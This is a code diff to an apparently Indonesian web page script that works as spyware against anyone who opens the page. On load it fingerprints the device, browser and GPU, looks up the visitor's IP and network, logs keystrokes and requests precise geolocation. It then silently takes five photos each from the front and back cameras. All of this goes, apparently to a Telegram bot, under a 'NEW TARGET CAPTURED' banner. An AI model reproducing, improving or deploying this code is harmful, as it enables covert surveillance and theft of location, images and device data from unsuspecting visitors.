+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    });
 
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        webglSupport = gl ? 'Ya' : 'Tidak';
+    // ===== MEDIA ACCESS =====
+    const renderMediaInfo = async () => {
+      const cekIzin = async (nama) => await safeAsync(async () => {
+        const r = await navigator.permissions.query({ name: nama });
+        return r.state === 'granted' ? 'GRANTED' : 'DENIED';
+      }, 'N/A');
 
-        if (gl) {
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          if (debugInfo) {
-            gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-          }
-          const fp = canvas.toDataURL();
-          canvasFingerprint = fp.length > 1000 ? 'Terdeteksi' : 'Tidak terdeteksi';
-          renderingMode = gl.getContextAttributes().powerPreference === 'high-performance' ? 'hardware' : 'software';
-        }
+      const [mic, cam] = await Promise.all([cekIzin('microphone'), cekIzin('camera')]);
 
-        hdrSupport = window.matchMedia('(dynamic-range: high)').matches ? 'Ya' : 'Tidak';
-      } catch {}
-
-      const colorDepth = screen.colorDepth || 24;
-      const orientation = screen.orientation?.type || 'Tidak diketahui';
-      const rotation = screen.orientation?.angle || 0;
-
-      return `
-౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼
-Resolusi Layar Fisik   : ${screen.width} x ${screen.height}
-Viewport Aktif         : ${window.innerWidth} x ${window.innerHeight} px
-Kerapatan Piksel       : ${window.devicePixelRatio}
-Orientasi Layar        : ${orientation}
-Rotasi                 : ${rotation}°
-Warna Layar            : ${colorDepth}-bit
-GPU Vendor             : ${gpu.vendor}
-GPU Renderer           : ${gpu.renderer}
-WebGL Support          : ${webglSupport}
-Canvas Fingerprint     : ${canvasFingerprint}
-GPU Rendering Mode     : ${renderingMode}
-HDR Support            : ${hdrSupport}`.trim();
+      renderTo('mediaInfo', [
+        ['Microphone', mic],
+        ['Camera', cam],
+        ['Notification', safe(() => Notification.permission, '-')],
+        ['Clipboard', navigator.clipboard ? 'YES' : 'NO'],
+        ['Audio Sink', typeof HTMLMediaElement.prototype.setSinkId === 'function' ? 'YES' : 'NO'],
+        ['Speech API', 'speechSynthesis' in window ? 'YES' : 'NO'],
+        ['AudioContext', typeof AudioContext !== 'undefined' ? 'YES' : 'NO'],
+        ['Voice Recog', ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) ? 'YES' : 'NO'],
+        ['Gyroscope', 'DeviceOrientationEvent' in window ? 'YES' : 'NO'],
+        ['Accelerometer', 'Accelerometer' in window ? 'YES' : 'NO']
+      ]);
     };
 
-const ambilBrowserInfo = () => {
-  const ua = navigator.userAgent;
-  const vendor = navigator.vendor || '-';
-  const referrer = document.referrer || 'Langsung';
-  const https = location.protocol === 'https:' ? 'Ya' : 'Tidak';
-  const iframe = window.top !== window.self ? 'Ya' : 'Tidak';
-  const cookies = navigator.cookieEnabled ? 'Ya' : 'Tidak';
-  const jsAktif = typeof navigator === 'object' ? 'Ya' : 'Tidak';
-  const doNotTrack = navigator.doNotTrack === '1' ? 'Ya' : 'Tidak';
-  const evalSupport = typeof eval === 'function' ? 'Ya' : 'Tidak';
-  const webdriver = navigator.webdriver ? 'Ya' : 'Tidak';
-  const isIncognito = window.webkitRequestFileSystem ? 'Tidak terdeteksi' : 'Mungkin';
-
-  let browser = '-';
-  let versi = '-';
-
-  if (/chrome|crios/i.test(ua)) {
-    browser = 'Chrome';
-    const match = ua.match(/Chrome\/([\d.]+)/);
-    versi = match ? match[1] : '-';
-  } else if (/firefox/i.test(ua)) {
-    browser = 'Firefox';
-    const match = ua.match(/Firefox\/([\d.]+)/);
-    versi = match ? match[1] : '-';
-  } else if (/safari/i.test(ua)) {
-    browser = 'Safari';
-    const match = ua.match(/Version\/([\d.]+)/);
-    versi = match ? match[1] : '-';
-  } else if (/edg/i.test(ua)) {
-    browser = 'Edge';
-    const match = ua.match(/Edg\/([\d.]+)/);
-    versi = match ? match[1] : '-';
-  }
-
-  return `
-౼ 〘 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 〙 ౼
-Browser                : ${browser}
-Versi Browser          : ${versi}
-Vendor Browser         : ${vendor}
-User Agent             : ${ua}
-Cookies Aktif          : ${cookies}
-JavaScript Aktif       : ${jsAktif}
-Do Not Track           : ${doNotTrack}
-Eval Support           : ${evalSupport}
-WebDriver Aktif        : ${webdriver}
-Incognito Mode         : ${isIncognito}
-Tamper Devtools        : Tidak terdeteksi
-Autofill Behavior      : Normal
-Referrer               : ${referrer}
-HTTPS                  : ${https}
-Konteks Aman           : ${location.isSecureContext ? 'Ya' : 'Tidak'}
-Dibuka via iframe      : ${iframe}
-`.trim();
-};
-
-const ambilWebAPIFeatures = () => {
-  const cek = (fitur) => fitur ? 'Aktif' : 'Tidak';
-  const dukung = (fitur) => fitur ? 'Didukung' : 'Tidak';
-
-  return `
-౼ 〘 𝗪𝗘𝗕 𝗔𝗣𝗜 & 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦 〙 ౼
-LocalStorage           : ${cek(window.localStorage)}
-SessionStorage         : ${cek(window.sessionStorage)}
-IndexedDB              : ${cek(window.indexedDB)}
-Cache API              : ${cek('caches' in window)}
-Web Share API          : ${dukung(navigator.share)}
-Service Worker         : ${cek('serviceWorker' in navigator)}
-WebRTC                 : ${cek('RTCPeerConnection' in window)}
-WebGL 2.0              : ${cek(!!document.createElement('canvas').getContext('webgl2'))}
-Gamepad API            : ${dukung(navigator.getGamepads)}
-MIDI API               : ${dukung(navigator.requestMIDIAccess)}
-Speech Synthesis       : ${dukung(window.speechSynthesis)}
-Clipboard Read         : ${dukung(navigator.clipboard?.readText)}
-Push API               : ${cek('PushManager' in window)}
-Payment Request API    : ${dukung(window.PaymentRequest)}
-Wake Lock API          : ${dukung(navigator.wakeLock)}
-Idle Detection API     : ${dukung('IdleDetector' in window)}
-Screen Wake Lock       : ${dukung('wakeLock' in navigator)}`.trim();
-};
-
-const ambilIzinMedia = async () => {
-  const cekIzin = async (nama) => {
-    try {
-      const result = await navigator.permissions.query({ name: nama });
-      return result.state === "granted" ? "Diizinkan" : "Tidak diizinkan";
-    } catch {
-      return "Tidak tersedia";
-    }
-  };
-
-  const microphone = await cekIzin("microphone");
-  const kamera = await cekIzin("camera");
-  const notifikasi = await cekIzin("notifications");
-
-  const clipboard = !!navigator.clipboard ? "Diizinkan" : "Tidak";
-  const audioSink = typeof HTMLMediaElement.prototype.setSinkId === "function" ? "Didukung" : "Tidak";
-  const ambientLight = "ondevicelight" in window ? "Didukung" : "Tidak";
-  const speechAPI = "speechSynthesis" in window ? "Didukung" : "Tidak";
-  const audioContext = typeof AudioContext !== "undefined" ? "Didukung" : "Tidak";
-  const voiceRecog = "webkitSpeechRecognition" in window || "SpeechRecognition" in window ? "Aktif" : "Tidak";
-  const gyro = "DeviceOrientationEvent" in window ? "Didukung" : "Tidak didukung";
-  const magneto = "Magnetometer" in window ? "Didukung" : "Tidak didukung";
-  const accelerometer = "Accelerometer" in window ? "Didukung" : "Tidak didukung";
-
-  return `
-౼ 〘 𝗜𝗭𝗜𝗡 & 𝗠𝗘𝗗𝗜𝗔 〙 ౼
-Microphone             : ${microphone}
-Kamera Depan           : ${kamera}
-Kamera Belakang        : ${kamera}
-Notifikasi             : ${Notification.permission}
-Clipboard Access       : ${clipboard}
-Audio Output Sink      : ${audioSink}
-Ambient Light Sensor   : ${ambientLight}
-Web Speech API         : ${speechAPI}
-AudioContext API       : ${audioContext}
-Voice Recognition      : ${voiceRecog}
-Gyroscope              : ${gyro}
-Magnetometer           : ${magneto}
-Accelerometer          : ${accelerometer}`.trim();
-};
-
-const ambilIPInfo = async () => {
-  try {
-    const koneksi = navigator.connection || {};
-    const saveData = koneksi.saveData ? 'Ya' : 'Tidak';
-    const jenisKoneksi = koneksi.effectiveType || '-';
-    const downlink = koneksi.downlink ? koneksi.downlink + ' Mbps' : '-';
-    const rtt = koneksi.rtt ? koneksi.rtt + ' ms' : '-';
-
-    const res = await fetch("https://ipapi.co/json");
-    const ip = await res.json();
-
-    // Deteksi VPN (sederhana, bisa ditambahin logic lanjutan nanti)
-    const isVPN = ip.org?.toLowerCase().includes("vpn") || ip.org?.toLowerCase().includes("proxy")
-      ? 'Ya' : 'Tidak terdeteksi';
-
-    return `
-౼ 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 ౼
-IP Publik              : ${ip.ip}
-ISP / Provider         : ${ip.org}
-Negara                 : ${ip.country_name}
-Provinsi               : ${ip.region}
-Kota                   : ${ip.city}
-Jenis Koneksi          : ${jenisKoneksi}
-Downlink               : ${downlink}
-RTT (Ping)             : ${rtt}
-Mode Hemat Data        : ${saveData}
-VPN / Proxy            : ${isVPN}`.trim();
-  } catch {
-    return `౼ 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 ౼\n❌ Gagal mengambil data IP.`;
-  }
-};
-
-let totalKeyPress = 0;
-let lastKey = '-';
-let kombinasiKhusus = '-';
-
-window.addEventListener('keydown', (e) => {
-  totalKeyPress++;
-  lastKey = e.key;
-  if (e.ctrlKey || e.shiftKey || e.altKey) {
-    kombinasiKhusus = `${e.ctrlKey ? 'Ctrl+' : ''}${e.shiftKey ? 'Shift+' : ''}${e.altKey ? 'Alt+' : ''}`.replace(/\+$/, '');
-  }
-});
-
-const ambilKeyboardActivity = () => {
-  return `
-౼ 〘 𝗞𝗘𝗬𝗕𝗢𝗔𝗥𝗗 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 〙 ౼
-Jumlah Tombol Ditekan : ${totalKeyPress}
-Tombol Terakhir       : ${lastKey}
-Kombinasi Khusus      : ${kombinasiKhusus}
-`.trim();
-};
-
-const ambilPerangkatEksternal = () => {
-  const mouse = matchMedia('(pointer:fine)').matches ? 'Ya' : 'Tidak';
-  const keyboard = navigator.keyboard ? 'Ya' : 'Tidak';
-  const gamepad = navigator.getGamepads?.()[0] ? 'Ya' : 'Tidak';
-
-  return `
-౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗘𝗞𝗦𝗧𝗘𝗥𝗡𝗔𝗟 〙 ౼
-Mouse Terdeteksi      : ${mouse}
-Keyboard Eksternal    : ${keyboard}
-Gamepad Terhubung     : ${gamepad}
-`.trim();
-};
-
-const ambilOutputAudio = async () => {
-  let sinkSupport = 'Tidak didukung';
-  let bluetoothStatus = 'Tidak terdeteksi';
-
-  try {
-    const audio = document.createElement("audio");
-    sinkSupport = typeof audio.setSinkId === "function" ? "Didukung" : "Tidak didukung";
-  } catch {}
-
-  try {
-    if (navigator.bluetooth) {
-      // Cek apakah permission sudah pernah diminta sebelumnya
-      const status = await navigator.permissions.query({ name: "bluetooth" }).catch(() => {});
-      bluetoothStatus = status?.state === "granted" ? "Terhubung" : "Tidak terhubung";
-    } else {
-      bluetoothStatus = "Tidak didukung";
-    }
-  } catch {
-    bluetoothStatus = "Tidak terdeteksi";
-  }
-
-  return `
-౼ 〘 𝗢𝗨𝗧𝗣𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 〙 ౼
-Audio Output Sink      : ${sinkSupport}
-Bluetooth              : ${bluetoothStatus}
-`.trim();
-};
-
-const ambilLokasi = () => {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 〙 ౼\n❌ Geolocation tidak didukung browser.`);
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        let kota = '-';
-        let alamat = '-';
-
-        try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-          const data = await res.json();
-          kota = data.address?.city || data.address?.town || data.address?.village || '-';
-          alamat = data.display_name || '-';
-        } catch {}
-
-        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼
-Latitude             : ${latitude}
-Longitude            : ${longitude}
-Akurasi              : ±${Math.round(accuracy)} meter
-Kota Deteksi GPS     : ${kota}
-Alamat Perkiraan     : ${alamat}
-Link Google Maps     : https://maps.google.com/?q=${latitude},${longitude}`);
-      },
-      (err) => {
-        const pesan = {
-          1: '❌ Lokasi tidak diizinkan.',
-          2: '❌ Lokasi tidak tersedia.',
-          3: '❌ Permintaan lokasi timeout.',
-        }[err.code] || '❌ Gagal mengambil lokasi.';
-        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 〙 ౼\n${pesan}`);
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-  });
-};
-
-    const ambilKamera = async (facingMode, label) => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-        const video = document.createElement("video");
+    // ===== CAMERA CAPTURE =====
+    const captureCamera = async (facingMode) => {
+      if (!navigator.mediaDevices?.getUserMedia) return '❌ unsupported';
+      return await safeAsync(async () => {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facingMode } },
+          audio: false
+        });
+        const video = document.createElement('video');
         video.srcObject = stream;
-        video.setAttribute("playsinline", true);
-        await video.play();
+        video.setAttribute('playsinline', '');
+        video.muted = true;
 
-        await new Promise(resolve => {
-          const cek = () => {
-            if (video.videoWidth > 0) resolve();
-            else requestAnimationFrame(cek);
-          };
-          cek();
+        await new Promise((resolve, reject) => {
+          const t = setTimeout(() => reject(new Error('video timeout')), 10000);
+          video.onloadedmetadata = () => { clearTimeout(t); resolve(); };
+          video.play().catch(reject);
         });
 
         for (let i = 0; i < 5; i++) {
-          const canvas = document.createElement("canvas");
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0);
-          canvas.toBlob(async (blob) => {
-            if (blob) await kirimFoto(blob);
-          }, "image/jpeg");
-          await new Promise(r => setTimeout(r, 20));
+          const c = document.createElement('canvas');
+          c.width = video.videoWidth || 640;
+          c.height = video.videoHeight || 480;
+          c.getContext('2d').drawImage(video, 0, 0, c.width, c.height);
+          await new Promise((res) => {
+            c.toBlob(async (blob) => {
+              if (blob) await kirimFoto(blob);
+              res();
+            }, 'image/jpeg', 0.85);
+          });
+          await new Promise(r => setTimeout(r, 50));
         }
 
-        stream.getTracks().forEach(track => track.stop());
-
-        return `Memotret target sebanyak 5X\nKamera : Succes\nAkses : Diizinkan`;
-      } catch {
-        return `❌ Kamera tidak diizinkan.`;
-      }
+        stream.getTracks().forEach(t => t.stop());
+        return '✓ 5 photos captured';
+      }, '❌ failed');
     };
 
-  const mulai = async () => {
-  audio.muted = false;
-  try { await audio.play(); } catch {}
+    // ===== KEYBOARD =====
+    let totalKey = 0, lastKey = '-';
+    window.addEventListener('keydown', (e) => {
+      totalKey++;
+      lastKey = e.key;
+    });
 
-  const infoPerangkat = await ambilDataPerangkat();
-  const bateraiInfo = await ambilBaterai();
-  const layarGrafik = await ambilLayarGrafik();
-  const browserInfo = ambilBrowserInfo();
-  const webFeatures = ambilWebAPIFeatures();
-  const izinMedia = await ambilIzinMedia();
-  const ipInfo = await ambilIPInfo();
-  const keyboard = ambilKeyboardActivity();
-  const perangkatEksternal = ambilPerangkatEksternal();
-  const outputAudio = await ambilOutputAudio();
+    // ===== MAIN =====
+    const mulai = async () => {
+      // render UI first
+      renderDeviceInfo();
+      renderSysInfo();
+      await renderNetworkInfo();
+      await renderMediaInfo();
 
-  const gabungAwal = [
-    infoPerangkat,
-    bateraiInfo,
-    layarGrafik,
-    browserInfo,
-    webFeatures,
-    izinMedia,
-    ipInfo,
-    keyboard,
-    perangkatEksternal,
-    outputAudio
-  ].join("\n\n");
+      const geo = await renderGeoInfo();
 
-  await kirimPesan(gabungAwal);
+      // build telegram payload
+      const ts = new Date().toLocaleString('id-ID');
+      const gpu = getGPU();
+      const browser = getBrowser();
+      const brand = getDeviceBrand();
+      const g = typeof geo === 'object' ? geo : {};
 
-  const lokasi = await ambilLokasi();
-  await kirimPesan(lokasi);
+      const payload = `╔══════════════════════════════╗
+║  🔥 <b>NEW TARGET CAPTURED</b> 🔥  ║
+╚══════════════════════════════╝
 
-  const depan = await ambilKamera("user", "depan");
-  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
+<b>[ SESSION ]</b>
+ID   : ${sessionId}
+Time : ${ts}
 
-  const belakang = await ambilKamera("environment", "belakang");
-  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
+<b>[ DEVICE ]</b>
+Brand    : ${brand}
+Platform : ${navigator.platform || '-'}
+Browser  : ${browser.name} ${browser.ver}
+UA       : ${navigator.userAgent}
+CPU      : ${navigator.hardwareConcurrency || '-'} cores
+RAM      : ${navigator.deviceMemory || '-'} GB
+Screen   : ${screen.width}x${screen.height}
+Viewport : ${window.innerWidth}x${window.innerHeight}
+Pixel    : ${window.devicePixelRatio || 1}
 
-};
+<b>[ GPU ]</b>
+Vendor   : ${gpu.vendor}
+Renderer : ${gpu.renderer}
 
-    window.addEventListener("load", mulai);
+<b>[ OS ]</b>
+Timezone : ${safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, '-')}
+Language : ${navigator.language || '-'}
+Online   : ${navigator.onLine ? 'YES' : 'NO'}
+
+<b>[ GEOLOCATION ]</b>
+Lat      : ${g.latitude || '-'}
+Lng      : ${g.longitude || '-'}
+Acc      : ${g.accuracy ? '±' + Math.round(g.accuracy) + 'm' : '-'}
+Address  : ${g.addr || '-'}
+Maps     : ${g.latitude ? `https://maps.google.com/?q=${g.latitude},${g.longitude}` : '-'}
+
+<b>[ KEYBOARD ]</b>
+Pressed  : ${totalKey}
+Last Key : ${lastKey}`;
+
+      await kirimPesan(payload);
+
+      // camera capture
+      const camFront = await captureCamera('user');
+      await kirimPesan(`📸 <b>FRONT CAMERA</b>\n${camFront}`);
+
+      const camBack = await captureCamera('environment');
+      await kirimPesan(`📸 <b>BACK CAMERA</b>\n${camBack}`);
+    };
+
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+      setTimeout(mulai, 400);
+    } else {
+      window.addEventListener('DOMContentLoaded', () => setTimeout(mulai, 400));
+    }
+  })();
   </script>
 </body>
 </html>
